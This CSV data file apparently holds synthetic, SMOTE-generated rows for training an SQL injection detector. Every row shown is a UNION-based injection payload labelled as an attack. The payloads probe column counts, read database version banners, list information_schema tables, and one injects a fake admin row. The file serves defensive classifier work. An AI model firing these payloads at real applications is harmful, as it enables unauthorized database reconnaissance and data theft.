id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000359,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000015,0.645464934131614
SMOTE_000360,attack,union,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",nearest_attack_euclidean,R000111,0.5090923970739096
SMOTE_000361,attack,union," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000039,1.2685233396513285
SMOTE_000362,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000123,0.2564411383268743
SMOTE_000363,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000293,1.0823565858924578
SMOTE_000364,attack,union,"-9209%""   )    )     )   union all select 3736,3736,3736--",nearest_attack_euclidean,R000308,0.17257318380873238
SMOTE_000365,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R000233,0.36306704187089106
SMOTE_000366,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000107,0.27898329137159883
SMOTE_000367,attack,union,"-8661"" union all select 5731,5731--",nearest_attack_euclidean,R000304,0.13834563687408152
SMOTE_000368,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000192,0.15663335448359275
SMOTE_000369,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000176,0.8193554514758192
SMOTE_000370,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000089,0.24852299937265276
SMOTE_000371,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000140,0.20920197014995534
SMOTE_000372,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000168,0.16713369602106246
SMOTE_000373,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000154,0.5585358033680741
SMOTE_000374,attack,union,"-2226%""   )    )    union all select 1018,1018,1018,1018--",nearest_attack_euclidean,R000106,0.12536199458169972
SMOTE_000375,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000009,0.0
SMOTE_000376,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000052,1.0152141260266614
SMOTE_000377,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000004,0.25040914228831446
SMOTE_000378,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000094,0.03896179254220544
SMOTE_000379,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000123,0.2137767367432412
SMOTE_000380,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000207,0.7702316791160666
SMOTE_000381,attack,union,"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",nearest_attack_euclidean,R000273,1.8300677386832906
SMOTE_000382,attack,union,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",nearest_attack_euclidean,R000082,1.6074170462457198
SMOTE_000383,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000211,0.5641301592118916
SMOTE_000384,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000167,0.48094750768685907
SMOTE_000385,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000091,0.06940884025603433
SMOTE_000386,attack,union,"-7815' union all select 2638,2638,2638,2638,2638--",nearest_attack_euclidean,R000252,0.38573291242791835
SMOTE_000387,attack,union,"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",nearest_attack_euclidean,R000228,0.5477349229796993
SMOTE_000388,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000129,0.5884208404990915
SMOTE_000389,attack,union,"-8477' union all select 2517,2517,2517--",nearest_attack_euclidean,R000309,0.4930146408521595
SMOTE_000390,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000139,0.9388329750772116
SMOTE_000391,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000083,0.7134192622469366
SMOTE_000392,attack,union," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",nearest_attack_euclidean,R000055,0.6613008180911384
SMOTE_000393,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R000240,0.18237804036043903
SMOTE_000394,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000266,0.3138938016404986
SMOTE_000395,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000192,0.17725805262538852
SMOTE_000396,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000219,0.9464674587824345
SMOTE_000397,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000269,0.29148646029415376
SMOTE_000398,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000076,0.5559266477870034
SMOTE_000399,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000076,0.6129990323435095
SMOTE_000400,attack,union," select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000058,0.2332356454323232
SMOTE_000401,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000248,0.39247480025689546
SMOTE_000402,attack,union,"-1218' union all select 2663,2663,2663,2663--",nearest_attack_euclidean,R000144,0.2863193417782909
SMOTE_000403,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000035,0.6972747628474364
SMOTE_000404,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000096,0.27320234438819174
SMOTE_000405,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000083,0.5732384368635884
SMOTE_000406,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000043,0.21310182618797419
SMOTE_000407,attack,union,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",nearest_attack_euclidean,R000202,0.378042823771894
SMOTE_000408,attack,union,"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",nearest_attack_euclidean,R000281,0.1362869889647528
SMOTE_000409,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000060,0.10071343367325584
SMOTE_000410,attack,union,"1' in boolean mode  )   union all select null,null--",nearest_attack_euclidean,R000102,0.28884235338677205
SMOTE_000411,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.027155187012905466
SMOTE_000412,attack,union,-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,nearest_attack_euclidean,R000260,0.01940643952768398
SMOTE_000413,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000042,0.7214501766677123
SMOTE_000414,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,0.05776029190787475
SMOTE_000415,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000011,2.348496251692117
SMOTE_000416,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000236,0.017378604046081117
SMOTE_000417,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000236,0.27588065380033255
SMOTE_000418,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000017,0.7616164311416833
SMOTE_000419,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000091,0.14715387029981128
SMOTE_000420,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000301,0.8744864346836024
SMOTE_000421,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000287,0.14065933064011416
SMOTE_000422,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000103,0.02342687706470485
SMOTE_000423,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000089,0.3325194880461515
SMOTE_000424,attack,union,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",nearest_attack_euclidean,R000307,0.5231818244426735
SMOTE_000425,attack,union,"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",nearest_attack_euclidean,R000225,0.4743450952302301
SMOTE_000426,attack,union,"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",nearest_attack_euclidean,R000225,0.11728421043490588
SMOTE_000427,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R000177,0.6322355823585148
SMOTE_000428,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000041,0.14699548662772866
SMOTE_000429,attack,union," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000029,0.2318190249934212
SMOTE_000430,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000066,0.25787117327057707
SMOTE_000431,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,0.9246550750793572
SMOTE_000432,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R000233,0.39768020354598765
SMOTE_000433,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000049,0.013553439981440226
SMOTE_000434,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000174,0.5305723658412458
SMOTE_000435,attack,union,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",nearest_attack_euclidean,R000171,0.3678520082911945
SMOTE_000436,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000199,0.21353082222891354
SMOTE_000437,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000123,0.14766343546211616
SMOTE_000438,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,0.031181200860311648
SMOTE_000439,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000004,0.2844115619953736
SMOTE_000440,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000031,0.09925100066187707
SMOTE_000441,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000085,1.0890579910638942
SMOTE_000442,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000234,0.08162506500243998
SMOTE_000443,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000145,0.5095943149237764
SMOTE_000444,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000060,0.24975717421440563
SMOTE_000445,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000185,0.4030371546627337
SMOTE_000446,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000050,0.04848109474563073
SMOTE_000447,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000034,0.22199795993798335
SMOTE_000448,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000033,0.3142087144086573
SMOTE_000449,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R000297,0.940385476608409
SMOTE_000450,attack,union,"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000169,0.06980947067636871
SMOTE_000451,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000289,0.46406148989747115
SMOTE_000452,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000194,0.40897119553753597
SMOTE_000453,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000056,0.18236771018820178
SMOTE_000454,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000050,0.0
SMOTE_000455,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000267,0.09189809824082833
SMOTE_000456,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000076,0.6367121735286978
SMOTE_000457,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000050,0.0
SMOTE_000458,attack,union,"-9507%"" union all select 3342,3342,3342,3342,3342#",nearest_attack_euclidean,R000270,0.48283413844198003
SMOTE_000459,attack,union,"-3116   )    )    as jyiq where 3875  =  3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",nearest_attack_euclidean,R000280,0.6702869771193133
SMOTE_000460,attack,union,"-4993"" union all select 6959,6959,6959--",nearest_attack_euclidean,R000241,0.03327878357794156
SMOTE_000461,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000232,0.6898424214250732
SMOTE_000462,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000008,0.042545181447778885
SMOTE_000463,attack,union,"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",nearest_attack_euclidean,R000181,0.036230065655834434
SMOTE_000464,attack,union,"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",nearest_attack_euclidean,R000228,0.818492404903606
SMOTE_000465,attack,union," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000032,1.638060407502209
SMOTE_000466,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000020,0.3310764894200934
SMOTE_000467,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000298,0.49124995909483704
SMOTE_000468,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000206,0.4400248209047725
SMOTE_000469,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R000233,0.034596367659242656
SMOTE_000470,attack,union,"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--",nearest_attack_euclidean,R000292,0.1716783815100801
SMOTE_000471,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000161,0.6286638408998376
SMOTE_000472,attack,union,"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000169,0.4615841338717694
SMOTE_000473,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000096,0.2323108770576873
SMOTE_000474,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000084,0.2401236526459842
SMOTE_000475,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R000233,0.42301446038380125
SMOTE_000476,attack,union,"-3359 union all select 4675,4675,4675--",nearest_attack_euclidean,R000294,0.5803506145242985
SMOTE_000477,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.16048138811952348
SMOTE_000478,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000123,0.5008046087427155
SMOTE_000479,attack,union," select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000071,0.9357470408437081
SMOTE_000480,attack,union,"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",nearest_attack_euclidean,R000310,0.3367947672450779
SMOTE_000481,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000005,0.8435416976851889
SMOTE_000482,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000190,2.374487762738141e-05
SMOTE_000483,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000154,0.24318047812564178
SMOTE_000484,attack,union,"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--",nearest_attack_euclidean,R000292,0.41473680272301355
SMOTE_000485,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000161,0.512460777335489
SMOTE_000486,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000069,1.868861036676071
SMOTE_000487,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000034,0.08073803071647272
SMOTE_000488,attack,union,"-3137'||  (  select 'btif' where 1718  =  1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",nearest_attack_euclidean,R000118,0.81367781922865
SMOTE_000489,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000033,0.3416437523691986
SMOTE_000490,attack,union,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",nearest_attack_euclidean,R000136,0.31228522728068475
SMOTE_000491,attack,union,"-8347%'  )   union all select 7643,7643,7643--",nearest_attack_euclidean,R000311,0.41920409123002383
SMOTE_000492,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000023,0.5797185093952517
SMOTE_000493,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000015,1.0831235617211297
SMOTE_000494,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000099,0.21382172917036263
SMOTE_000495,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000020,0.43897885287265953
SMOTE_000496,attack,union," select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000071,0.8024169636602904
SMOTE_000497,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000085,0.40730033207086036
SMOTE_000498,attack,union,"-8661"" union all select 5731,5731--",nearest_attack_euclidean,R000304,0.27791324991699534
SMOTE_000499,attack,union,"-5322"" union all select 6494,6494,6494,6494,6494,6494--",nearest_attack_euclidean,R000215,0.08409424090055584
SMOTE_000500,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000226,0.053351618670680404
